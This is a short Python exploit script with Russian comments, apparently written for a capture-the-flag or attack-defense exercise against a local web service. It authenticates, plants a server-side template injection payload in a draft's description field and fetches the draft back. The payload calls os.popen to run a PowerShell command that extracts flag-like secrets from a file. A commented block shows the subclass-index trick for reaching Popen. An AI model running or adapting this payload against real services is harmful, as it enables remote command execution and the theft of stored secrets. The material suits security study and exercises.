import requests
import json
# Выводим их с индексами и модулями
import subprocess, os, sys, warnings, _io, pickle

#
# for idx, cls in enumerate(''.__class__.__mro__[1].__subclasses__()):
#     if cls.__name__ == 'Popen' and cls.__module__ == 'subprocess':
#         print(f"Индекс Popen: {idx}")
#         break


# Получение токена
response1 = requests.post(
    "http://localhost:8000/token",
    data={"username": "2", "password": "2"},
    headers={"Content-Type": "application/x-www-form-urlencoded"}
)
token = response1.json()["access_token"]

url = "http://localhost:8000/gdz/save_draft"

malicious_description = """{{
    getattr(
        os.popen('powershell -c "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Select-String -Path ''drafts/1.txt'' -Pattern ''TEAM\\\\d{3}_[A-Z0-9]{32}'' | ForEach-Object { $_.Matches.Value }"'),
        'read'
    )()
}}"""
draft_data = {
    "description": malicious_description,
    "full_description": "Test full description",
    "category": "math",
    "subject": "algebra",
    "content_text": "Sample content",
    "price": 0,
    "is_elite": False,
    "gdz_id": None
}

headers = {
    "Authorization": f"Bearer {token}",
}

try:
    response = requests.post(
        url,
        json=draft_data,
        headers=headers
    )
    response.raise_for_status()
    print("Успешный ответ:", response.json())
except requests.exceptions.HTTPError as e:
    print("HTTP ошибка:", e.response.status_code, e.response.text)
except requests.exceptions.RequestException as e:
    print("Ошибка запроса:", str(e))


response3 = requests.get(
url = "http://localhost:8000/gdz/get_draft",
headers = {"Authorization": f"Bearer {token}"}
)

print (response3.json())




